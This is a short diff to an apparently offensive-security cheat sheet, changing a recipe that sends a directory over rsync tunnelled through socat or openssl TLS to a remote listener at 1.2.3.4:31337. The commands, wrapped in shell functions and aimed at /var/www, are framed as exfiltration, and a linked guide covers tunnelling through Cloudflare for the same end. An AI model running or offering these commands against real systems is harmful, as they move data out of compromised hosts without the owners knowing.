@@ -1159,6 +1159,7 @@ openssl req -subj '/CN=example.com/O=EL/C=XX' -new -newkey ed25519 -days 14 -nod
 cat ssl.key ssl.crt >ssl.pem
 rm -f ssl.key ssl.crt
 mkdir upload
+cat ssl.pem
 socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.pem EXEC:"rsync --server -logtprR --safe-links --partial upload"
 ```
 
@@ -1166,10 +1167,15 @@ Sender:
 ```posh
 # Copy the ssl.pem from the Receiver to the Sender and send directory named 'warez'
 # Using rsync + socat-ssl
-rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:1.2.3.4:31337,cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- ./warez  0:
-
+up1() {
+   rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:1.2.3.4:31337,cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- "$@"  0:
+}
 # Using rsync + openssl
-rsync -ahPRv -e "bash -c 'openssl s_client -connect 1.2.3.4:31337 -servername example.com -cert ssl.pem -CAfile ssl.pem -quiet 2>/dev/null' #" -- ./warez  0:
+up2() {
+   rsync -ahPRv -e "bash -c 'openssl s_client -connect 1.2.3.4:31337 -servername example.com -cert ssl.pem -CAfile ssl.pem -quiet 2>/dev/null' #" -- "$@"  0:
+}
+up1 /var/www/./warez
+up2 /var/www/./warez
 ```
 
 Rsync can be combined to exfil via [https / cloudflared raw TCP tunnels](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service).  
